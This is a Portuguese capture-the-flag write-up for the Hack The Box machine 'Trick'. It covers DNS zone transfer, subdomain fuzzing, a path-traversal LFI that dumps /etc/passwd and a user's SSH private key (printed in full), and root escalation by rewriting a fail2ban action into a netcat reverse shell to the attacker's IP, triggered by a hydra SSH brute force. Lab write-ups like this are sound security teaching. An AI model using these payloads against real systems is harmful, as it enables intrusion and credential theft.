# TRICK

# Dificuldade : Fácil

<h1>Dessa vez um CTF de dificuldade fácil, porém, diria que foi extremamente interessante entender o processo de escalar privilégio usado para resolver a flag root.</h1>

A maquina é a [TRICK](https://app.hackthebox.com/machines/Trick).

Enumeração #1:

Iniciando com aquele nmap basico.

```
nmap -p- -sS --min-rate 5000 -vvv -n -Pn -oN allports 10.10.11.166
 PORT   STATE SERVICE REASON
22/tcp open  ssh     syn-ack ttl 63
25/tcp open  smtp    syn-ack ttl 63
53/tcp open  domain  syn-ack ttl 63
80/tcp open  http    syn-ack ttl 63
...
```

#Pagina porta 80

![Untitled](https://user-images.githubusercontent.com/32500664/188253767-dbadcf19-5ba8-4d13-9eb2-d5feb3024a5f.png)

Eu tentei tentei e tentei achar alguma brecha nessa pagina e algum diretório fora do “comum” porém sem sucesso ;(. 

#SMTP

Usei alguns script do nmap usando o `nmap -p25 --script "smtp*" -oN smtp {ip}`. Infelizmente mais uma porta aberta seguida de uma portada na cara…

Sem sucesso nas portas abertas e nem uma brechinha na pagina web… Vamos “cavar” mais fundo…

Usando o comando `dig axfr @10.10.11.166 trick.htb`

```bash
; <<>> DiG 9.18.4 <<>> axfr @10.10.11.166 trick.htb
; (1 server found)
;; global options: +cmd
trick.htb.              604800  IN      SOA     trick.htb. root.trick.htb. 5 604800 86400 2419200 604800
trick.htb.              604800  IN      NS      trick.htb.
trick.htb.              604800  IN      A       127.0.0.1
trick.htb.              604800  IN      AAAA    ::1
preprod-payroll.trick.htb. 604800 IN    CNAME   trick.htb.
trick.htb.              604800  IN      SOA     trick.htb. root.trick.htb. 5 604800 86400 2419200 604800
```

Acho que achamos o X 🦜. D**ois subdomínios para adicionar ao etc/host. O root é inútil, pois é a mesma página. Por outro lado, o “preprod-payrool” tem uma página de login. Tentei injeção sql utilizando SQLmap no formulário de login do site mas nada positivo... Pensei na possibilidade de existir mais alguns subdominios como preprod-XYZW.**

adicionando o `trick.htb ao arquivo /etc/hosts que tem como função, função de mapear um nome para um endereço IP. E é um dos primeiros a ser verificado assim que a URL é digitada.`

Depois de adicionado usando o FFUF para “fuzzar” o Header Host: afim de verificar qual passa pela requisição.

```bash
ffuf -w /wordlist/Dirb/big.txt/:FUZZ -u http://trick.htb/ -H 'Host: preprod-FUZZ.trick.htb' -v -fs 5480

[Status: 200, Size: 9660, Words: 3007, Lines: 179]
| URL | http://trick.htb/
    * FUZZ: marketing
```

# Acesso não autorizado, Autorizado! Ué ?

Depos de adicionar o novo dominio descoberto ao arquivo /etc/hosts podemos acessar uma pagina bastante interessante… Quando você seleciona qualquer aba no menu de navegação, a url muda para `index.php?page=about.html` . Isso é abre brechas para testes que se positivos (pra mim, pro cliente nem tanto…) permitem um LFI. Usando uma wordlists da seclist com o ffuf para automatizar esse fuzzing…

```bash
ffuf -w /home/sant/wordlist/SecLists/Fuzzing/LFI/LFI-Jhaddix.txt:FUZZ -u http://preprod-marketing.trick.htb/index.php\?page\=FUZZ -v -fs 0

[Status: 200, Size: 2351, Words: 28, Lines: 42, Duration: 150ms]
| URL | http://preprod-marketing.trick.htb/index.php?page=....//....//....//....//....//....//....//....//....//....//....//....//....//....//....//....//....//....//....//....//etc/passwd
    * FUZZ: ....//....//....//....//....//....//....//....//....//....//....//....//....//....//....//....//....//....//....//....//etc/passwd

```
Depois que o primeiro resultado der positivo pode parar a ferramenta (CTRL + C) QUE 1 TÁ BOM :)
![Untitled 1](https://user-images.githubusercontent.com/32500664/188253769-914dbf3a-8599-48b9-bab1-9299e6ff3a41.png)
```

Temos um nome de um usuário…

Utilizando o comando curl pra pegar a arquivo que contem a chave privada do usuário michael.

```bash
$curl http://preprod-marketing.trick.htb/index.php\?page\=....//....//....//....//....//....//....//....//....//....//....//....//....//....//....//....//....//....//....//....//....//....//home/michael/.ssh/id_rsa

-----BEGIN OPENSSH PRIVATE KEY-----
b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAABFwAAAAdzc2gtcn
NhAAAAAwEAAQAAAQEAwI9YLFRKT6JFTSqPt2/+7mgg5HpSwzHZwu95Nqh1Gu4+9P+ohLtz
c4jtky6wYGzlxKHg/Q5ehozs9TgNWPVKh+j92WdCNPvdzaQqYKxw4Fwd3K7F4JsnZaJk2G
YQ2re/gTrNElMAqURSCVydx/UvGCNT9dwQ4zna4sxIZF4HpwRt1T74wioqIX3EAYCCZcf+
4gAYBhUQTYeJlYpDVfbbRH2yD73x7NcICp5iIYrdS455nARJtPHYkO9eobmyamyNDgAia/
Ukn75SroKGUMdiJHnd+m1jW5mGotQRxkATWMY5qFOiKglnws/jgdxpDV9K3iDTPWXFwtK4
1kC+t4a8sQAAA8hzFJk2cxSZNgAAAAdzc2gtcnNhAAABAQDAj1gsVEpPokVNKo+3b/7uaC
DkelLDMdnC73k2qHUa7j70/6iEu3NziO2TLrBgbOXEoeD9Dl6GjOz1OA1Y9UqH6P3ZZ0I0
+93NpCpgrHDgXB3crsXgmydlomTYZhDat7+BOs0SUwCpRFIJXJ3H9S8YI1P13BDjOdrizE
hkXgenBG3VPvjCKiohfcQBgIJlx/7iABgGFRBNh4mVikNV9ttEfbIPvfHs1wgKnmIhit1L
jnmcBEm08diQ716hubJqbI0OACJr9SSfvlKugoZQx2Iked36bWNbmYai1BHGQBNYxjmoU6
IqCWfCz+OB3GkNX0reINM9ZcXC0rjWQL63hryxAAAAAwEAAQAAAQASAVVNT9Ri/dldDc3C
aUZ9JF9u/cEfX1ntUFcVNUs96WkZn44yWxTAiN0uFf+IBKa3bCuNffp4ulSt2T/mQYlmi/
KwkWcvbR2gTOlpgLZNRE/GgtEd32QfrL+hPGn3CZdujgD+5aP6L9k75t0aBWMR7ru7EYjC
tnYxHsjmGaS9iRLpo79lwmIDHpu2fSdVpphAmsaYtVFPSwf01VlEZvIEWAEY6qv7r455Ge
U+38O714987fRe4+jcfSpCTFB0fQkNArHCKiHRjYFCWVCBWuYkVlGYXLVlUcYVezS+ouM0
fHbE5GMyJf6+/8P06MbAdZ1+5nWRmdtLOFKF1rpHh43BAAAAgQDJ6xWCdmx5DGsHmkhG1V
PH+7+Oono2E7cgBv7GIqpdxRsozETjqzDlMYGnhk9oCG8v8oiXUVlM0e4jUOmnqaCvdDTS
3AZ4FVonhCl5DFVPEz4UdlKgHS0LZoJuz4yq2YEt5DcSixuS+Nr3aFUTl3SxOxD7T4tKXA
fvjlQQh81veQAAAIEA6UE9xt6D4YXwFmjKo+5KQpasJquMVrLcxKyAlNpLNxYN8LzGS0sT
AuNHUSgX/tcNxg1yYHeHTu868/LUTe8l3Sb268YaOnxEbmkPQbBscDerqEAPOvwHD9rrgn
In16n3kMFSFaU2bCkzaLGQ+hoD5QJXeVMt6a/5ztUWQZCJXkcAAACBANNWO6MfEDxYr9DP
JkCbANS5fRVNVi0Lx+BSFyEKs2ThJqvlhnxBs43QxBX0j4BkqFUfuJ/YzySvfVNPtSb0XN
jsj51hLkyTIOBEVxNjDcPWOj5470u21X8qx2F3M4+YGGH+mka7P+VVfvJDZa67XNHzrxi+
IJhaN0D5bVMdjjFHAAAADW1pY2hhZWxAdHJpY2sBAgMEBQ==
-----END OPENSSH PRIVATE KEY-----
```

Copie toda chave para seu computador criando o arquivo usado para acessar a conta de michael…

```bash
echo "{cole a chave aqui dentro entre aspas}" > id_rsa
```

Apos criar o arquivo id_rsa… De permissões para que seja legivel no momento do login com ssh

`chmod 600 id_rsa`

e em seguida use a chave para logar com o usuário michael

`ssh -i id_rsa michael@{IP da maquina HTB}`

e funciona !!!

![Untitled 2](https://user-images.githubusercontent.com/32500664/188253806-8e7946e9-472d-424b-a360-b1b5d9535483.png)

# FLAG USER

![Untitled 3](https://user-images.githubusercontent.com/32500664/188253813-b54915db-8733-4fd2-b919-ad112c3871d2.png)

# FLAG ROOT

Uma vez dentro o comum seria executar o comando `sudo -l` para verificar se o usuário que estamos logados possuem algum privilégio, e temos!!

```bash
michael@trick:~$ sudo -l
Matching Defaults entries for michael on trick:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User michael may run the following commands on trick:
    (root) NOPASSWD: /etc/init.d/fail2ban restart
```

fail2ban é um software que tem como função banir o IP de quem falha muitas vezes o login ao SSH.

E pesquisando é possivel encontrar artigos sobre o escalonamento de privilégios utilizando essa ferramenta como fonte.

Basicamente temos que editar o arquivo **`/etc/fail2ban/action.d/iptables-multiport.conf`** que é responsavel por guardar os comandos executados pelo root quando ele banir alguem…

Como o dono do arquivo é o root não podemos editar-lo, porém, podemos substitui-lo.

```bash
#Vamos copiar o arquivo para o diretório que estamos.

$ cp /etc/fail2ban/action.d/iptables-multiport.conf .

#E edita-lo com o nano/vim (dependendo do qual você usar... Somos possiveis amigos)
... (Vamos editar o comando `actionban` para conseguir shell como root)
actionban =  rm -f /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc {Seu ip tun0} 4242 >/tmp/f
...
#CTRL + X seguido de Y + Enter para salvar.
#Criamos nosso arquivo "bomba" agora só substituir pelo arquivo original.

$ mv iptables-multiport.conf /etc/fail2ban/action.d/iptables-multiport.conf

#O mv vai perguntar se você quer substituir... Você digita "y" e dá enter

$ mv: replace '/etc/fail2ban/action.d/iptables-multiport.conf', overriding mode 0644 (rw-r--r--)? y

#Executando comando como root para reiniciar o fail2ban

$ sudo /etc/init.d/fail2ban restart
```

#Agora é só forçar ele a executar o comando… Como fazemos isso ? TOMANDO BAN por merecimento.

Abre uma outra aba no seu terminal ou “splita” ele no meio e escuta a porta que vai receber a reverse shell: (no meu caso a 4242)

`nc -nvlp 4242`

E TOMA-LE BAN

`hydra -l michael -P /home/sant/wordlist/rockyou.txt ssh://10.10.11.166`

Esse comando inicia um ataque de força bruta ao ssh da maquina e em questão de segundos recebemos a shell de root

```bash
$ nc -lvp 4242
Connection from 10.10.11.166:49380
/bin/sh: 0: can't access tty; job control turned off
$ whoami
root
$ cd /root
$ cat root.txt
!!!!!! FLAG ROOT !!!!!!
```
